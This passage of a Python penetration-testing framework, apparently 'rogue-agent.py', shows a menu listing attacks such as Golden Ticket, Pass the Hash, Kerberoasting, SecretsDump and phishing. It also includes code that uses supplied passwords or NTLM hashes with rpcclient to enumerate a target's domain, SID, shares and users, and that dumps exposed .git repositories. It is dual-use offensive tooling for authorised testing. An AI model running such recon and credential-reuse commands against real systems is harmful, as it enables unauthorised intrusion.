      if loop == 21 and EMPTY_9[:5] == "EMPTY": print (colored(EMPTY_9,colour7), end=' ')
      if loop == 22 and EMPTY_10[:5] == "EMPTY": print (colored(EMPTY_10,colour7), end=' ')
      if loop == 23 and EMPTY_11[:5] == "EMPTY": print (colored(EMPTY_11,colour7), end=' ')
      if loop == 24 and EMPTY_12[:5] == "EMPTY": print (colored(EMPTY_12,colour7), end=' ')
      
      if loop == 25 and communityString[:5] == "EMPTY": 
        print (colored(communityString,colour7), end=' ')
      else:
         if loop ==25:
             print(colored(communityString[:COL1],colour6), end=' ')
      
      if loop == 26 and FuzzRider[:5] == "EMPTY": 
         print (colored(FuzzRider,colour7), end=' ')
      else:
         if loop == 26: 
            print(colored(FuzzRider[:COL1],colour6), end=' ')
      
      if loop == 27 and currentWordlist[:5] == "EMPTY":
         print (colored(currentWordlist,colour7), end=' ')
      else:
         if loop == 27:
            print (colored(currentWordlist[-COL1:][:COL1],colour6), end=' ')
      
#      if loop == 28 and EMPTY_16[:5] == "EMPTY": print (colored(EMPTY_16,colour7), end=' ')
#      if loop == 29 and currentWordlist[:5] == "EMPTY": print (colored(currentWordlist,colour7), end=' ')

      print('\u2551', end=' ')       
      print(colored(SHAR[loop],colour6), end=' ')   
      print('\u2551', end=' ')   
      print(colored(USER[loop],colour6), end=' ')
      print(colored(HASH[loop],colour6), end=' ')
      print('\u2551', end=' ')      
      if portsTCP[loop][:5] == "EMPTY":
         print(colored(portsTCP[loop], colour7), end=' ')
      else:
         print(colored(portsTCP[loop], colour6), end=' ')      
      print('\u2551', end=' ')   
      print(colored(servsTCP[loop], colour6), end=' ')
      print('\u2551', end=' ')
      if portsUDP[loop][:5] == "EMPTY":
         print(colored(portsUDP[loop], colour7), end=' ')
      else:
         print(colored(portsUDP[loop], colour6), end=' ')
      print('\u2551', end=' ')   
      print(colored(servsUDP[loop], colour6), end=' ')              
      print('\u2551' + " "*65 + '\u2551')

   print('\u2560' + ('\u2550')*14 + '\u2569' + ('\u2550')*42 + '\u2569' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u2569' + ('\u2550')*58 + '\u2569' + ('\u2550')*7 + '\u2569' + ('\u2550')*34 + '\u2569' + ('\u2550')*7 + '\u2569' + ('\u2550')*34 + '\u2569' +  ('\u2550')*65 + '\u2563' )
   return
   
def options():
   print('\u2551' + "(01) Re/Set O/S FORMAT  (11) Re/Set DOMAINSID (31) Get Arch (41) WinLDAP Search (51) Kerberos Info (61) Gold Ticket (71) ServScanner (81)             (91 ) FTP      (231) Scan Live PORTS (341) Edit   Usernames (441) Whois DNS    (500) WordPress Scan (600) LFI OS Checker (   )           (    )                      " + '\u2551')
   
   print('\u2551' + "(02) Re/Set DNS ADDRESS (12) Re/Set SUBDOMAIN (32) Net View (42) Look up SecIDs (52) Kerberos Auth (62) Gold DC PAC (72) VulnScanner (82)", end= ' ')
   if proxyChains == 1:
      print(colored(menuName,colour0, attrs=['blink']), end= ' ')
   else:
      print(menuName, end= ' ')    
   print("(92 ) SSH      (232) TCP PORTS  Scan (342) Edit   Passwords (442) Dig DNS      (501) WP Plugin Scan (601) LFI   Wordlist (   )		(    )                      " + '\u2551')   
   
   print('\u2551' + "(03) Re/Set IP  ADDRESS (13) Re/Set FILE NAME (33) Services (43) Sam Dump Users (53) KerberosBrute (63) Domain Dump (73) ExplScanner (83) GenSSHKeyID (93 ) SSHKeyID (233) UDP PORTS  Scan (343) Edit NTLM Hashes (443) Enum DOMAIN  (502) Nuclei WP Scan (   )		(   )		(    )		            " + '\u2551')   
   print('\u2551' + "(04) Re/Set LIVE  PORTS (14) Re/Set SHARENAME (34) AT  Exec (44) REGistry Hives (54) KerbeRoasting (64) Blood Hound (74) Expl Finder (84) GenListUser (94 ) Telnet   (234) Basic Serv Scan (344) Edit   Host.conf (444) Recon DOMAIN (503)                (   )		(   )		(    )		            " + '\u2551')
   print('\u2551' + "(05) Re/Set WEBSITE URL (15) Re/Set ALT  SERV (35) DComExec (45) Enum EndPoints (55) ASREPRoasting (65) LAPS Dumper (75) ExplCreator (85) GenListPass (95 ) Netcat   (235) Light Serv Scan (345) Edit Resolv.conf (445) Enum Sub-DOM (504)                (   )		(   )		(    )		            " + '\u2551')
   print('\u2551' + "(06) Re/Set USER   NAME (26)                  (36) PS  Exec (46) Rpc ClientServ (56) PASSWORD2HASH (66) SecretsDump (76) Dir Listing (86) NTDSDECRYPT (96 ) MSSQL    (236) Heavy Serv Scan (346) Edit ProxyChains (446) EnumVirtHOST (505)                (   )		(   )		(    )		            " + '\u2551')
   print('\u2551' + "(07) Re/Set PASS   WORD (27)                  (37) SMB Exec (47) Smb ClientServ (57) Pass the HASH (67) CrackMapExe (77) SNMP Walker (87) Hail! HYDRA (97 ) MySQL    (237)                 (347) Edit  Kerb5.conf (447) FUZZ Sub-DOM (506)                (   )		(   )		(    )		            " + '\u2551')
   print('\u2551' + "(08) Re/Set NTLM   HASH (28) Re/Set Community (38) WMO Exec (48) Smb Map SHARES (58) OverPass HASH (68) PSExec HASH (78) ManPhishCod (88) RedisClient (98 ) WinRm    (238)                 (348)                  (448)              (507)                (   )		(   )		(    )		            " + '\u2551')
   print('\u2551' + "(09) Re/Set TICKET NAME (29) Re/Set FUZZRIDER (39) NFS List (49) Smb Dump Files (59) Kerbe5 Ticket (69) SmbExecHASH (79) AutoPhisher (89) Remote Sync (99 ) RemDesk  (239)                 (349)                  (449)              (508)                (   )		(   )		(    )		            " + '\u2551')
   print('\u2551' + "(10) Re/Set DOMAIN NAME (30) Re/Set WORD LIST (40) NFSMount (50) Smb MountSHARE (60) Silver Ticket (70) WmiExecHASH (80) MSF Console (90) Rsync Dumps (100) RDPBrute (240)                 (350)                  (450)              (509)                (   )		(   )		(1000) Exit                 " + '\u2551')
   print('\u255A' + ('\u2550')*315 + '\u255D')
   return

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : START OF MAIN - Check running as root.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

if os.geteuid() != 0:
   print("\n[*] Please run this python3 script as root...")
   exit(1)
else:
   proxyChains = 0
   menuName = "ProxyChains"
    
# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Create local user-friendly variables.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

netWork = "tun0"							# LOCAL INTERFACE
maxUser = 5000								# UNLIMITED VALUE
colour0 = "red"								# DISPLAY COLOURS
colour1 = "grey"
colour2 = "cyan"
colour3 = "blue"
colour4 = "black"
colour5 = "white"
colour6 = "green"
colour7 = "yellow"
colour8 = "magenta"
Yellow  = '\e[1;93m'							# OP SYSTEM COLOUR
Green   = '\e[0;32m'
Reset   = '\e[0m'
Red     = '\e[1;91m'
dataDir = "ROGUEAGENT"							# LOCAL DIRECTORYS
httpDir = "TREADSTONE"
workDir = "BLACKBRIAR"
explDir = "OUTCOME"
powrDir = "LARX"
fileExt = "py,sh,js,xlsx,docx,doc,txt,xml,bak,zip,php,html,pdf,dat"	# FILE EXTENSIONS
keyPath = "python3 /usr/share/doc/python3-impacket/examples/"		# PATH 2 IMPACKET

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Check the local interface specified above is up.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

os.system("ifconfig -a | grep -E -o '.{0,5}: flag.{0,5}' | grep -E -o '.{0,5}:' > up.tmp")
with open("up.tmp","r") as localInterface:
   up = localInterface.readlines()
if netWork not in str(up):
   print(colored("\n[!] WARNING!!! - You need to specify your local network interface on line 774 of the rogue-agent.py file...", colour0))
   exit(1)
else:
   os.system("ip a s " + netWork + " | awk '/inet/ {print $2}' > localIP.tmp")
   localIP, null = linecache.getline("localIP.tmp", 1).rstrip("\n").split("/")
      
# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Connect to local database
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

if not os.path.exists(dataDir + "/RA.db"):
   print(colored("[!] WARNING!!! - Unable to connect to database...", colour0))
   exit(1)
else:
   connection = sqlite3.connect(dataDir + "/RA.db")
   cursor = connection.cursor()

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Display program banner and boot system.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

localCOM("xdotool key Alt+Shift+S; xdotool type 'DARK OPERATIVE'; xdotool key Return")
dispBanner("DARKOPERATIVE",1)
print(colored("\t\t\t  L A R X  E D I T I O N",colour7,attrs=['bold']))
print(colored("\n\n[*] Booting, please wait...", colour3))
print("[+] Using localhost IP address " + localIP + "...")

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Initialise program files and variables.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

dirList = [dataDir, workDir, httpDir, explDir, powrDir]
for x in range(0, len(dirList)):
   if not os.path.exists(dirList[x]):
      print("[-] Missing required files, you must run install.py first...")
      exit(1)
   else:
      print("[+] Directory " + dirList[x] + " already exists...")               
print("[+] Populating system variables...")
if not os.path.exists(dataDir + "/usernames.txt"):			
   localCOM("touch " + dataDir + "/usernames.txt")
   print("[+] File usernames.txt created...")
else:
   print("[+] File usernames.txt already exists...")       
if not os.path.exists(dataDir + "/passwords.txt"):			
   localCOM("touch " + dataDir + "/passwords.txt")
   print("[+] File passwords.txt created...")
else:
   print("[+] File passwords.txt already exists...")      
if not os.path.exists(dataDir + "/hashes.txt"):			
   localCOM("touch " + dataDir + "/hashes.txt")
   print("[+] File hashes.txt created...")
else:
   print("[+] File hashes.txt already exists...")        
if not os.path.exists(dataDir + "/shares.txt"):
   localCOM("touch " + dataDir + "/shares.txt")
   print("[+] File shares.txt created...")
else:
   print("[+] File shares.txt already exists...")        
if not os.path.exists(dataDir + "/tokens.txt"):
   localCOM("touch " + dataDir + "/tokens.txt")
   print("[+] File tokens.txt created...")
else:
   print("[+] File tokens.txt already exists...")   
   
screenLength = 28
   
SKEW = 0                                	# TIME-SKEW SWITCH
DOMC = 0                                	# DOMAIN SWITCH
DOMC2 = 0					# SUB DOMAIN SWITCH
DNSC = 0                                	# DNS SWITCH
HTTP = 0					# HTTP SERVER PORT

COL0 = 19					# MAX LEN COMPUTER NAME
COL1 = 40                               	# MAX LEN SESSION DATA
COL2 = 44                               	# MAX LEN SHARE NAME
COL3 = 23                               	# MAX LEN USER NAME
COL4 = 32                               	# MAX LEN NTLM HASH
COL5 = 1                                	# MAX LEN TOKEN VALUE

SHAR = [" "*COL2]*maxUser			# SHARE NAMES
USER = [" "*COL3]*maxUser			# USER NAMES
HASH = [" "*COL4]*maxUser			# NTLM HASH
VALD = ["0"*COL5]*maxUser			# USER TOKENS

tcpPorts = ""					# ALL TCP PORTS
udpPorts = ""					# ALL UDP PORTS
portsTCP = ["EMPTY"]*screenLength		# TCP PORTS [x]
portsUDP = ["EMPTY"]*screenLength		# UDP PORTS [x] 
servsTCP = [" "*COL4]*screenLength      	# TCP SERVICE BANNER
servsUDP = [" "*COL4]*screenLength 		# UDP SERVICE BANNER

coloum_one_Labels = [" "*COL1]*screenLength	# LABELS
coloum_one_Labels[0]  = "O/S  FORMAT"
coloum_one_Labels[1]  = "DNS ADDRESS"
coloum_one_Labels[2]  = "IP  ADDRESS"
coloum_one_Labels[3]  = "LIVE  PORTS"
coloum_one_Labels[4]  = "WEBSITE URL"
coloum_one_Labels[5]  = "USER   NAME"
coloum_one_Labels[6]  = "PASS   NAME"
coloum_one_Labels[7]  = "NTLM   HASH"
coloum_one_Labels[8]  = "TICKET NAME"
coloum_one_Labels[9]  = "DOMAIN NAME"
coloum_one_Labels[10] = "DOMAIN  SID"
coloum_one_Labels[11] = "SUB  DOMAIN"
coloum_one_Labels[12] = "FILE   NAME"
coloum_one_Labels[13] = "SHARE  NAME"
coloum_one_Labels[14] = "UNALLOCATED"
coloum_one_Labels[15] = "UNALLOCATED"
coloum_one_Labels[16] = "UNALLOCATED"
coloum_one_Labels[17] = "UNALLOCATED"
coloum_one_Labels[18] = "UNALLOCATED"
coloum_one_Labels[19] = "UNALLOCATED"
coloum_one_Labels[20] = "UNALLOCATED"
coloum_one_Labels[21] = "UNALLOCATED"
coloum_one_Labels[22] = "UNALLOCATED"
coloum_one_Labels[23] = "UNALLOCATED"
coloum_one_Labels[24] = "UNALLOCATED"
coloum_one_Labels[25] = "COMMUNITY  "
coloum_one_Labels[26] = "FUZZ  RIDER"
coloum_one_Labels[27] = "WORD   LIST"
#coloum_one_Labels[28] = "UNALLOCATED"
#coloum_one_Labels[29] = "UNALLOCATED" 

# TEMP ASSIGNGED VALUES

EMPTY_1 = "EMPTY                                   "
EMPTY_2 = "EMPTY                                   "
EMPTY_3 = "EMPTY                                   "
EMPTY_4 = "EMPTY                                   "
EMPTY_5 = "EMPTY                                   "
EMPTY_6 = "EMPTY                                   "
EMPTY_7 = "EMPTY                                   "
EMPTY_8 = "EMPTY                                   "
EMPTY_9 = "EMPTY                                   "
EMPTY_10 = "EMPTY                                   "
EMPTY_11 = "EMPTY                                   "
EMPTY_12 = "EMPTY                                   "
EMPTY_13 = "EMPTY                                   "
EMPTY_14 = "EMPTY                                   "
communityString = "public                                  "
FuzzRider = "--hl 0                                  "
currentWordlist = "/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt"

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Check the database for stored variables.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

print("[+] Configuration database found - restoring saved data....")
col = cursor.execute("SELECT * FROM REMOTETARGET WHERE IDS = 1").fetchone()
localCOM("echo " + col[1]  + " | base64 -d >  ascii.tmp")
localCOM("echo " + col[2]  + " | base64 -d >> ascii.tmp")
localCOM("echo " + col[3]  + " | base64 -d >> ascii.tmp")
localCOM("echo " + col[4]  + " | base64 -d >> ascii.tmp")
localCOM("echo " + col[5]  + " | base64 -d >> ascii.tmp")
localCOM("echo " + col[6]  + " | base64 -d >> ascii.tmp")
localCOM("echo " + col[7]  + " | base64 -d >> ascii.tmp")
localCOM("echo " + col[8]  + " | base64 -d >> ascii.tmp")
localCOM("echo " + col[9]  + " | base64 -d >> ascii.tmp")
localCOM("echo " + col[10] + " | base64 -d >> ascii.tmp")
localCOM("echo " + col[11] + " | base64 -d >> ascii.tmp")
localCOM("echo " + col[12] + " | base64 -d >> ascii.tmp")
localCOM("echo " + col[13] + " | base64 -d >> ascii.tmp")
localCOM("echo " + col[14] + " | base64 -d >> ascii.tmp")

OSF = linecache.getline("ascii.tmp", 1).rstrip("\n")
COM = linecache.getline("ascii.tmp", 2).rstrip("\n")
DNS = linecache.getline("ascii.tmp", 3).rstrip("\n")
TIP = linecache.getline("ascii.tmp", 4).rstrip("\n")
PTS = linecache.getline("ascii.tmp", 5).rstrip("\n")
WEB = linecache.getline("ascii.tmp", 6).rstrip("\n")
USR = linecache.getline("ascii.tmp", 7).rstrip("\n")
PAS = linecache.getline("ascii.tmp", 8).rstrip("\n")
NTM = linecache.getline("ascii.tmp", 9).rstrip("\n")
TGT = linecache.getline("ascii.tmp", 10).rstrip("\n")
DOM = linecache.getline("ascii.tmp", 11).rstrip("\n")
SID = linecache.getline("ascii.tmp", 12).rstrip("\n")
FIL = linecache.getline("ascii.tmp", 13).rstrip("\n")
TSH = linecache.getline("ascii.tmp", 14).rstrip("\n")

if USR.rstrip(" ") == "":
   USR = "\'\'"   
if PAS.rstrip(" ") == '':
   PAS = "\'\'"
POR = PTS
OSF = spacePadding(OSF, COL1)
COM = spacePadding(COM, COL0)
DNS = spacePadding(DNS, COL1)
TIP = spacePadding(TIP, COL1)
POR = spacePadding(POR, COL1)
WEB = spacePadding(WEB, COL1)
USR = spacePadding(USR, COL1)
PAS = spacePadding(PAS, COL1)
NTM = spacePadding(NTM, COL1)
TGT = spacePadding(TGT, COL1)
DOM = spacePadding(DOM, COL1)
SID = spacePadding(SID, COL1)
FIL = spacePadding(FIL, COL1)
TSH = spacePadding(TSH, COL1)

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Check other files for stored variables.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

with open(dataDir + "/usernames.txt", "r") as read1, open(dataDir + "/hashes.txt", "r") as read2, open(dataDir + "/tokens.txt", "r") as read3, open(dataDir + "/shares.txt", "r") as read4:
   for x in range(0, maxUser):
      USER[x] = read1.readline()
      HASH[x] = read2.readline()
      VALD[x] = read3.readline()
      SHAR[x] = read4.readline()            
      SHAR[x] = spacePadding(SHAR[x], COL2)         
      USER[x] = spacePadding(USER[x], COL3)
      HASH[x] = spacePadding(HASH[x], COL4)    
      VALD[x] = spacePadding(VALD[x], COL5)
if DNS[:5] != "EMPTY":
   localCOM("echo 'nameserver " + DNS.rstrip(" ") + "' >> /etc/resolv.conf")
   DNSC = 1
if DOM[:5] != "EMPTY":
   localCOM("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
   DOMC = 1        
count = TIP.count(':')      
if count > 1:
   IP46 = "-6"
else:
   IP46 = "-4"      
time.sleep(5)

for loop in range(0, screenLength):
   for x in POR.split(","):
      portsTCP[loop] = spacePadding(x,5)
      loop = loop + 1
   break
   
# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Start the main menu controller.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

while True: 
   saveParams()
   clearClutter()
   checkParam = 0							# RESET'S VALUE
   LTM = getTime()							# GET CLOCKTIME
   localCOM("clear")							# CLEARS SCREEN
   dispMenu()								# DISPLAY UPPER
   options()								# DISPLAY LOWER
   selection=input("[?] Please select an option: ")			# SELECT CHOICE

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Secret option that autofill's PORTS, DOMAIN, SID, SHARES, USERS etc.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='0':
      PTS = getPorts(PTS)
      POR = spacePadding(PTS, COL1)      
      squidCheck()
      SKEW = timeSync(SKEW)      
      print(colored("[*] Attempting to connect to rpcclient...", colour3))                                             
      if NTM[:5] != "EMPTY": 
         print("[i] Using HASH value as password credential for rpcclient...")
         remoteCOM("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")
      else:
         remoteCOM("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")     
      errorCheck = linecache.getline("lsaquery.tmp", 1)                              
      if (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
         print("[-] Unable to connect to RPC data...")
         checkParam = 1
      else:
         print("[+] Connection successful...")               
      if checkParam != 1:
         print(colored("[*] Attempting to enumerate domain name...", colour3))               
         try:
            null,DOM = errorCheck.split(":")
            SID = " "*COL1
         except ValueError:
            DOM = "EMPTY" 
         DOM = DOM.lstrip(" ")
         DOM = spacePadding(DOM, COL1)                  
         if DOM[:5] == "EMPTY":
            print("[+] Unable to enumerate domain name...")
         else:
            print("[+] Found domain name...\n")
            print(colored(DOM,colour6))                      
 
         if DOMC == 1:
            print("\n[*] Resetting current domain associated host...")
            localCOM("sed -i '$d' /etc/hosts")
            localCOM("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
            print("[+] Domain " + DOM.rstrip(" ") + " has successfully been added to /etc/hosts...")
         else:
            localCOM("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
            print("\n[+] Domain " + DOM.rstrip(" ") + " successfully added to /etc/hosts...")
            DOMC = 1                                
         print(colored("[*] Attempting to enumerate domain SID...", colour3))                        
         line2 = linecache.getline("lsaquery.tmp", 2)
         try:
            null,SID = line2.split(":") 
         except ValueError:
            SID = "EMPTY"        
         SID = SID.lstrip(" ")          
         SID = spacePadding(SID, COL1)                    
         if SID[:5] == "EMPTY":
            print("[+] Unable to enumerate domain SID...")
         else:
            print("[+] Found SID...\n")
            print(colored(SID,colour6) + "\n")                
         print(colored("[*] Attempting to enumerate shares...", colour3))                  
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            remoteCOM("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'netshareenum' > shares.tmp")
         else:
            remoteCOM("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'netshareenum' > shares.tmp")               
         errorCheck = linecache.getline("shares.tmp", 1)   
         if (errorCheck[:9] == "Could not") or (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
            print("[-] Access to RPC data restricted...")
         else:
            for x in range(0, maxUser):
               SHAR[x] = " "*COL2
            localCOM("sed -i -n '/netname: /p' shares.tmp")
            localCOM("sed -i '/^$/d' shares.tmp")
            localCOM("cat shares.tmp | sort > sshares.tmp")            
            count = lineCount("sshares.tmp")                           
            if count > 0:
               print("[+] Found shares...\n")
               with open("sshares.tmp") as read:
                  for x in range(0, count):
                     SHAR[x]  = read.readline()
                     SHAR[x] = SHAR[x].replace(" ","")
                     try:
                        null, SHAR[x] = SHAR[x].split(":")
                     except ValueError:
                        SHAR[x] = "Error..."
                     print(colored(SHAR[x].rstrip("\n"),colour6))
                     SHAR[x] = dotPadding(SHAR[x], COL2)
                  print("")                  
         print(colored("[*] Attempting to enumerate domain users...", colour3))
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            remoteCOM("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers.tmp")
         else:
            remoteCOM("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers.tmp")               
         errorCheck = linecache.getline("domusers.tmp", 1)
         if (errorCheck[:9] == "Could not") or (errorCheck[:6] == "result") or (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
            print("[-] Access to RPC data restricted...")
         else:               
            localCOM("rm " + dataDir + "/usernames.txt")
            localCOM("rm " + dataDir + "/hashes.txt")                   
            localCOM("sort domusers.tmp > sdomusers.tmp")
            localCOM("sed -i '/^$/d' sdomusers.tmp")            
            count2 = lineCount("sdomusers.tmp")             
            if count2 > 0:
                print ("[+] Found users...\n")
                with open("sdomusers.tmp", "r") as read, open(dataDir + "/usernames.txt", "a") as write1, open(dataDir + "/hashes.txt", "a") as write2:
                   for x in range(0, count2):
                      line = read.readline()
                      if "user:[Guest]" in line:
                         null,rid = line.split("rid:")
                         rid = rid.replace("[","")
                         rid = rid.replace("]","")
                      try:
                         null1,USER[x],null2 = line.split(":")
                      except ValueError:
                         USER[x] = "Error..."                           
                      USER[x] = USER[x].replace("[","")
                      USER[x] = USER[x].replace("]","")
                      USER[x] = USER[x].replace("rid","")                     
                      if USER[x][:5] != "Error":
                         USER[x] = spacePadding(USER[x], COL3)
                         HASH[x] = spacePadding("", COL4)
                         if USER[x][:1] != " ":
                            write1.write(USER[x].rstrip(" ") + "\n")
                            write2.write(HASH[x].rstrip(" ") + "\n")                                                         
                            print(colored(USER[x],colour6))
            else:
               print("[+] Unable to enumerate domain users...")            
            print(colored("\n[*] Attempting to enumerate Guest password policy...", colour3))
            remoteCOM("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'getusrdompwinfo " + rid + "' > policy.tmp")            
            localCOM("sed -i '/ &info: struct samr_PwInfo/d' policy.tmp 2>&1")  
            localCOM("sed -i '/^s*$/d' policy.tmp 2>&1")
            catsFile("policy.tmp")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - 
# Details : 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '1':
      BAK = OSF
      OSF = input("[?] Please enter O/S format: ")      
      found = 0      
      if OSF != "":
         OSF = OSF.upper()
         if "EMPTY" in OSF:
            found = 1
         if "WINDOWS" in OSF:
            found = 1
         if "LINUX" in OSF:
            found = 1
         if "OS X " in OSF:
            found = 1
         if "ANDROID" in OSF:
            found = 1
         if "IOS" in OSF:
            found = 1
         if found == 0:
            print("[-] Operating system not found...")
            OSF = BAK
         else:
            print("[+] O/S succesfully set to " + OSF)
            OSF = spacePadding(OSF, COL1)
      else:
         print("[-] No changes were made...")
         OSF = BAK
      prompt()      

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change remote DNS SERVER name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='2':
      BAK = DNS
      DNS = input("[?] Please enter DNS IP address: ")      
      if DNS == "":
         DNS = BAK
      else:
         DNS = spacePadding(DNS, COL1)            
         if DNSC == 1:
            print("[+] Resetting current DNS IP association...")
            localCOM("sed -i '$d' /etc/resolv.conf")
            DNSC = 0            
         if DNSC == 0:
            if DNS[:5] != "EMPTY":
               count = DNS.count(':')       
               if count > 1:
                  print("[+] Defualting to IP 6...")
                  IP46 = "-6"
               else:
                  print("[+] Defaulting to IP 4...")
                  IP46 = "-4"                  
               print("[+] Adding DNS IP " + DNS.rstrip(" ") + " to /etc/resolv.conf...")
               localCOM("echo 'nameserver " + DNS.rstrip(" ") + "' >> /etc/resolv.conf")
               DNSC = 1               
         if DNSC == 1:
            COM = checkInterface("DNS", COM)
            networkSweep()
            checkBIOS()            
         prompt()    

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change remote IP address.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='3':
      BAK = TIP
      TIP = input("[?] Please enter remote IP address: ").upper()
      TIP = spacePadding(TIP, COL1)      
      if TIP[:1] == " ":
         TIP = BAK         
      if TIP[:5] == "EMPTY":
         print("[+] Remote IP address reset...")
         COM = spacePadding("UNKNOWN", COL0)
      else:
         checkParam = 0
         count = TIP.count(':')            
         if count == 6:
            try:
               bit1,bit2,bit3,bit4,bit5,bit6,bit7 = TIP.split(":")
               print("[+] Defualting to internet protocol 6...")
               IP46 = "-6"
               checkParam = 1
            except:
               print("[-] Unknown internet protocol...")
               TIP = spacePadding("EMPTY", COL1)                              
         count = TIP.count(".")         
         if count == 3:
            try:
               bit1,bit2,bit3,bit4 = TIP.split(".")
               print("[+] Defaulting to internet protocol 4...")
               IP46 = "-4"
               checkParam = 1
            except:
               print("[-] Unknown internet protocol...")
               TIP = spacePadding("EMPTY", COL1)                     
         if checkParam == 1:
            COM = checkInterface("TIP", COM)
            checkBIOS()
            networkSweep()
         else:
            print("[-] Unknown internet protocol...")
            TIP = spacePadding("EMPTY", COL1)                         
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the remote port ranges.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '4':
      print("[i] Current live port listing: " + PTS)
      BAK = POR
      POR = input("[?] Please enter port numbers: ")      
      if POR != "":
         PTS = POR
         POR = spacePadding(POR, COL1)
      else:
         POR = BAK
      squidCheck()
      SKEW = timeSync(SKEW)
      prompt()
         
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the web address.
# Modified: N/A++
# -------------------------------------------------------------------------------------

   if selection == '5':
      BAK = WEB
      WEB = input("[?] Please enter the web address: ")      
      if WEB != "":
         if proxyChains != 1:   
           checkWAF()   
           print(colored("\n[*] Enumerating website url methods and security headers...", colour3))
           target = WEB.replace("http://","")
           target = target.replace("https://","")
           localCOM("python3 ./" + explDir + "/insecure_methods.py " + target)
           localCOM("python3 ./" + explDir + "/depreciated_headers.py " + target)
           localCOM("python3 ./" + explDir + "/security_headers.py " + target)
           if "/.GIT" in WEB.upper():
              print(colored("[*] Attempting to enumerate .git repository...", colour3))
              localCOM("echo '" + Green + "'")
              remoteCOM("git-dumper " + WEB.rstrip(" ") + " repo")
              localCOM("echo '" + Reset + "'")
              if os.path.exists("repo"):
                 localCOM("mv ./repo ./" + workDir)     
         else:
            print("[-] Proxychains enabled, no enumeration available...")
      else:
         WEB = BAK
         print("[-] No action has been taken...")
      if len (WEB) < COL1:
         WEB = spacePadding(WEB, COL1)
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
